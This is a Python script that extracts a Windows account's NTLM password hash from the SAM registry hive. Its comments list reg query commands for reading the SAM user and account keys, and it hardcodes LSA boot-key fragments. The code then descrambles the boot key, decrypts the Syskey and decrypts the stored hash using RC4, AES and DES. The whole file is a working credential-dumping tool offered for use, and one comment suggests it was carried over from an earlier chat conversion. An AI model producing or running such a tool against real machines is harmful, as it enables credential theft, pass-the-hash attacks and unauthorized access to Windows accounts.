from Crypto.Cipher import AES, DES
import binascii, os, hashlib

RID = 500 #Administrator RID. Can be found with a simple whoami /all

# reg query "hklm\sam\sam\domains\account\users\000001F4" | find "V"
HexRegHash = ''

# reg query "hklm\SAM\SAM\Domains\Account" /v F | find "BINARY"
HexRegSysk = ''

#'HKLM\System\CurrentControlSet\Control\Lsa'
jd = '5d5991a3'
skew1 = '486c0596'
gbg = '5af83341'
data = '3f2cceb9'

def decryptRC4(data, key):
    data = binascii.unhexlify(data)
    key = binascii.unhexlify(key)
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    result = bytearray()
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        result.append(char ^ S[(S[i] + S[j]) % 256])
    return binascii.hexlify(result).decode()

def decryptAES(data, key, iv):
    data = binascii.unhexlify(data)
    key = binascii.unhexlify(key)
    iv = binascii.unhexlify(iv)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return binascii.hexlify(cipher.decrypt(data)).decode()

def decryptDES(data, key):
    data = binascii.unhexlify(data)
    key = binascii.unhexlify(key)
    cipher = DES.new(key, DES.MODE_ECB)
    return binascii.hexlify(cipher.decrypt(data)).decode()

def str_to_key(dessrc):
    bkey = binascii.unhexlify(dessrc)
    keyarr = [b for b in bkey]
    bytearr = [
        keyarr[0] >> 1,
        ((keyarr[0] & 0x01) << 6) | (keyarr[1] >> 2),
        ((keyarr[1] & 0x03) << 5) | (keyarr[2] >> 3),
        ((keyarr[2] & 0x07) << 4) | (keyarr[3] >> 4),
        ((keyarr[3] & 0x0F) << 3) | (keyarr[4] >> 5),
        ((keyarr[4] & 0x1F) << 2) | (keyarr[5] >> 6),
        ((keyarr[5] & 0x3F) << 1) | (keyarr[6] >> 7),
        keyarr[6] & 0x7F
    ]
    result = ''
    for b in bytearr:
        bit = bin(b * 2)[2:].zfill(8)
        if bit.count('1') % 2 == 0:
            result += hex((b * 2) ^ 1)[2:].zfill(2)
        else:
            result += hex(b * 2)[2:].zfill(2)
    return result

# The rest of the logic should be pasted here (already converted in previous messages)
# This includes username parsing, hash extraction, Syskey decryption, final hash decryption, etc.

# STEP 0: Extract Username
RegHash = binascii.unhexlify(HexRegHash)
UsernameOffset = int(binascii.hexlify(RegHash[0xc:0xc+1]), 16) + 0xcc
UsernameLength = int(binascii.hexlify(RegHash[0x10:0x10+1]), 16)
Username = RegHash[UsernameOffset:UsernameOffset+UsernameLength].replace(b'\x00', b'')
print('Username (offset 0xc): ' + Username.decode('utf-8', errors='ignore') + "\n")

# STEP 1: Extract the double encrypted NTLM Hash
print('####### ---- STEP1, extract the double encrypted NTLM Hash ---- #######')
Offset = HexRegHash[0xA8*2:(0xA8+4)*2]
HexOffset = "0x" + "".join(map(str.__add__, Offset[-2::-2], Offset[-1::-2]))
NTOffset = int(HexOffset, 16) + 0xcc

Length = HexRegHash[0xAC*2:(0xAC+4)*2]
HexLength = "0x" + "".join(map(str.__add__, Length[-2::-2], Length[-1::-2]))
Length = int(HexLength, 16)

print('Offset is ' + hex(NTOffset) + ' and length is ' + hex(Length))

Hash = HexRegHash[(NTOffset+4)*2: (NTOffset+4+Length)*2][:32]

if hex(Length) == '0x38':
    print('Detected New Style Hash (AES), need IV')
    Hash = HexRegHash[(NTOffset + 24) * 2: (NTOffset + 24 + Length) * 2][:32]
    IV = HexRegHash[(NTOffset + 8) * 2:(NTOffset + 24) * 2]
    print('NT IV: ' + IV)
elif hex(Length) != '0x14':
    print('Error: Length not 0x14, user probably has no password?')
    input('Press Enter to close')
    exit()

print('Double encrypted Hash should be ' + Hash + "\n")

# STEP 2: Combine the hBootKey
print('####### ---- STEP2, Combine the hBootKey ---- #######')
Scrambled = jd + skew1 + gbg + data
hBootkey = (
    Scrambled[8*2:8*2+2] + Scrambled[5*2:5*2+2] + Scrambled[4*2:4*2+2] + Scrambled[2*2:2*2+2] +
    Scrambled[11*2:11*2+2] + Scrambled[9*2:9*2+2] + Scrambled[13*2:13*2+2] + Scrambled[3*2:3*2+2] +
    Scrambled[0*2:0*2+2] + Scrambled[6*2:6*2+2] + Scrambled[1*2:1*2+2] + Scrambled[12*2:12*2+2] +
    Scrambled[14*2:14*2+2] + Scrambled[10*2:10*2+2] + Scrambled[15*2:15*2+2] + Scrambled[7*2:7*2+2]
)
print("Your hBootkey/Syskey should be " + hBootkey + "\n")

# STEP 3: Decrypt Syskey
print('####### ---- STEP3, use hBootKey to RC4/AES decrypt Syskey ---- #######')
hBootVersion = int(HexRegSysk[0x00:(0x00+1)*2], 16)

if hBootVersion == 3:
    print('Detected New Style hBootkey Hash too (AES), needs IV')
    hBootIV = HexRegSysk[0x78*2:(0x78+16)*2]
    encSysk = HexRegSysk[0x88*2:(0x88+32)*2][:32]
    Syskey = decryptAES(encSysk, hBootkey, hBootIV)
else:
    Part = binascii.unhexlify(HexRegSysk[0x70*2:(0x70+16)*2])
    Qwerty = ('!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%' + '\x00').encode()
    hBootkey_bytes = binascii.unhexlify(hBootkey)
    Digits = ('0123456789012345678901234567890123456789' + '\x00').encode()
    RC4Key = hashlib.md5(Part + Qwerty + hBootkey_bytes + Digits).digest()
    RC4KeyHex = binascii.hexlify(RC4Key).decode()
    encSysk = HexRegSysk[0x80*2:(0x80+32)*2][:32]
    Syskey = decryptRC4(encSysk, RC4KeyHex)

print('Your Full Syskey/SAMKey should be ' + Syskey + "\n")

# STEP 4: Decrypt the Hash
print('####### ---- STEP4, use SAM-/Syskey to RC4/AES decrypt the Hash ---- #######')
HexRID = hex(RID)[2:].zfill(8)
HexRID = binascii.unhexlify("".join(map(str.__add__, HexRID[-2::-2], HexRID[-1::-2])))

if hex(Length) == '0x14':
    NTPASSWORD = ('NTPASSWORD' + '\x00').encode()
    SYSKEY = binascii.unhexlify(Syskey)
    HashRC4Key = hashlib.md5(SYSKEY + HexRID + NTPASSWORD).digest()
    HashRC4KeyHex = binascii.hexlify(HashRC4Key).decode()
    EncryptedHash = decryptRC4(Hash, HashRC4KeyHex)
elif hex(Length) == '0x38':
    EncryptedHash = decryptAES(Hash, Syskey, IV)

print('Your encrypted Hash should be ' + EncryptedHash + "\n")

# STEP 5: Final Decryption using DES keys derived from RID
print('####### ---- STEP5, use DES derived from RID to fully decrypt the Hash ---- #######')
DESSOURCE1 = binascii.hexlify(
    bytes([HexRID[0], HexRID[1], HexRID[2], HexRID[3], HexRID[0], HexRID[1], HexRID[2]])
).decode()
DESSOURCE2 = binascii.hexlify(
    bytes([HexRID[3], HexRID[0], HexRID[1], HexRID[2], HexRID[3], HexRID[0], HexRID[1]])
).decode()

DESKEY1 = str_to_key(DESSOURCE1)
DESKEY2 = str_to_key(DESSOURCE2)

DecryptedHash = decryptDES(EncryptedHash[:16], DESKEY1) + decryptDES(EncryptedHash[16:], DESKEY2)

print('Your decrypted NTLM Hash should be ' + DecryptedHash)
